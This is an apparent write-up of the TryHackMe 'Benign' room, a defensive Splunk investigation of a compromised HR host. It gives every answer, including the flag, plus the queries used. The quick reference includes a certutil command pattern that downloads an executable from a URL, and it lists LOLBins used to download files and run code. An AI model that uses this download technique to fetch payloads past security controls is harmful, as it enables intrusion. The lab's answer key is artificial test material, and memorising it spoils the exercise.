# Benign - TryHackMe

> Investigate a compromised host using Splunk

**Room Link:** https://tryhackme.com/room/benign

<img width="1468" height="882" alt="image" src="https://github.com/user-attachments/assets/a0aed850-a9bb-48ce-9e2d-2cb04bcdd8ed" />

---

## Task 1: Introduction

**Scenario:** IDS alert about suspicious process execution

**Host:** HR department

**Tools detected:** Network enumeration, scheduled tasks

**Index:** win_eventlogs

**Event ID:** 4688 (Process creation)

**No answer needed**

---

## Task 2: Identify and Investigate Infected Host

### Network Segments

**IT Department:** James, Moin, Katrina

**HR Department:** Haroon, Chris, Diana

**Marketing:** Bell, Amelia, Deepak

### Questions

**Q1: Logs ingested from March 2022?**

Set date range for March 2022.

Check hit count.

- Answer: `13959`

---

**Q2: Name of imposter account?**

**Query:**
```spl
index=win_eventlogs 
| top limit=11 UserName
```

Check for typosquatted username.

- Answer: `Amel1a`

---

**Q3: HR user running scheduled tasks?**

**Query:**
```spl
index=win_eventlogs schtasks
```

Sort by CommandLine field.

Look for HR department user.

- Answer: `Chris.fort`

---

**Q4: HR user who downloaded payload via LOLBIN?**

**Query:**
```spl
index=win_eventlogs HostName="*HR*"
| rare limit=20 CommandLine
```

Look for certutil with download activity.

- Answer: `haroon`

---

**Q5: LOLBIN used to download payload?**

Check CommandLine from previous query.

Tool used to bypass security controls.

- Answer: `certutil.exe`

---

**Q6: Date binary was executed? (YYYY-MM-DD)**

Check timestamp from haroon's certutil activity.

- Answer: `2022-03-04`

---

**Q7: Third-party site accessed for payload?**

Check URL in certutil command.

- Answer: `controlc.com`

---

**Q8: File name saved from C2 server?**

Check certutil download command.

Look for output filename.

- Answer: `benign.exe`

---

**Q9: Malicious pattern THM{……….} in file?**

Visit the controlc.com URL.

Grab the flag from content.

- Answer: `THM{KJ&*H^B0}`

---

**Q10: URL infected host connected to?**

Full URL from certutil command.

- Answer: `https://controlc.com/e4d11035`

---

## Quick Reference

### Investigation Flow

```
IDS Alert
    ↓
Process Execution Logs
    ↓
Identify Imposter Account
    ↓
Find Scheduled Tasks
    ↓
Detect LOLBIN Usage
    ↓
Extract C2 URL
    ↓
Retrieve Malicious Payload
```

### Splunk Queries Used

**Count logs:**
```spl
index=win_eventlogs
```

**Top usernames:**
```spl
index=win_eventlogs 
| top limit=11 UserName
```

**Find scheduled tasks:**
```spl
index=win_eventlogs schtasks
```

**Rare commands (anomalies):**
```spl
index=win_eventlogs HostName="*HR*"
| rare limit=20 CommandLine
```

### Key Findings

**Imposter account:**
- Amel1a (typosquatting Amelia)
- Marketing department

**Scheduled tasks:**
- User: Chris.fort
- HR department

**Payload download:**
- User: haroon
- Tool: certutil.exe
- Date: 2022-03-04
- Source: controlc.com
- File: benign.exe

### Certutil Abuse

**Legitimate use:**
- Certificate management
- Windows built-in tool

**Malicious use:**
- Download payloads
- Bypass security
- LOLBin technique

**Command pattern:**
```cmd
certutil.exe -urlcache -f https://site.com/file.exe output.exe
```

**Detection:**
- certutil with -urlcache
- External URLs
- .exe downloads
- Non-Microsoft domains

### LOLBins (Living Off the Land Binaries)

**Common examples:**
- certutil.exe (download files)
- bitsadmin.exe (download files)
- powershell.exe (execute code)
- mshta.exe (run scripts)
- regsvr32.exe (execute DLLs)

**Why attackers use them:**
- Pre-installed on Windows
- Signed by Microsoft
- Less likely to trigger alerts
- Blend with normal activity

### Typosquatting Detection

**Pattern:**
- Similar to legitimate username
- Character substitution (1 for l, 0 for O)
- Easy to miss visually

**Example:**
- Legitimate: Amelia
- Imposter: Amel1a (1 instead of i)

**Detection method:**
```spl
| top limit=20 UserName
```

### C2 Communication

**Indicators:**
- File-sharing sites (controlc.com, pastebin.com)
- HTTPS downloads
- LOLBin usage
- Non-standard tools
- Suspicious filenames (benign.exe)

### Event ID 4688

**Windows Security Event**

**What it logs:**
- New process creation
- Process name
- Command line
- Parent process
- User account
- Timestamp

**Why it matters:**
- Tracks all executed commands
- Shows attacker activity
- Critical for forensics

### Splunk Commands

**top:**
```spl
| top limit=N field
```
Shows most common values.

**rare:**
```spl
| rare limit=N field
```
Shows least common values (anomalies).

**Wildcards:**
```spl
HostName="*HR*"
```
Matches any hostname with HR.

**Filter by field:**
```spl
index=win_eventlogs certutil
```

### Red Flags

**Account activity:**
- Typosquatted usernames
- Accounts in wrong departments
- Off-hours activity

**Process execution:**
- LOLBins with unusual arguments
- certutil downloading executables
- Scheduled tasks by regular users
- Commands to external sites

**Network:**
- File-sharing sites
- Unrecognized domains
- HTTPS to non-corporate sites

### Investigation Tips

**Use rare command:**
- Finds anomalies quickly
- Less noise than searching all
- Highlights unusual activity

**Filter by department:**
- Narrow down suspects
- Use hostname patterns
- HostName="*HR*"

**Check CommandLine:**
- Full context of execution
- Arguments reveal intent
- URLs show C2 communication

---

## Key Takeaways

- **Event ID 4688** logs process creation
- **Amel1a** typosquatted username
- **Typosquatting** easy to miss
- **Chris.fort** ran scheduled tasks
- **haroon** downloaded payload
- **certutil.exe** common LOLBin
- **LOLBins** bypass security
- **controlc.com** file-sharing C2
- **benign.exe** malicious file
- **rare command** finds anomalies
- **CommandLine** shows full context
- **Always verify** usernames
- **File-sharing sites** abused for C2

Happy hunting
